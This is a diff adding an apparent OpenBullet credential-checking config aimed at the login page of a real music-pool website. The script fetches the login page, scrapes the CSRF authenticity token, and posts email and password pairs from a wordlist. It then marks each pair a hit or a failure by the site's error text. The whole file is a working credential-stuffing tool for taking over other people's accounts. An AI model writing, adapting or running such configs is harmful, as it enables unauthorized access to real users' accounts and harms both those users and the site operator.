@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "LatinosMusicPool",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-09T14:57:52.1873293+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "http://www.latinomusicpool.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_UTF8 PARSE "<SOURCE>" CSS "[name=utf8]" "value" 0 -> VAR "UTF8" "" "" 
+#PARSE_AUTHENTICITY_TOKEN PARSE "<SOURCE>" CSS "[name=authenticity_token]" "value" 0 -> VAR "AUTHENTICITY_TOKEN" "" "" 
+#POST_LOGIN REQUEST POST "https://www.latinomusicpool.com/users/sign_in" AutoRedirect=TRUE 
+  CONTENT "user[email]=<USER>&user[password]=<PASS>&authenticity_token=<AUTHENTICITY_TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "newCookie: " 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.latinomusicpool.com/" 
+  HEADER "Origin: https://www.latinomusicpool.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Invalid email or password." 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+  KEYCHAIN Retry OR 
+    KEY "The change you wanted was rejected." 
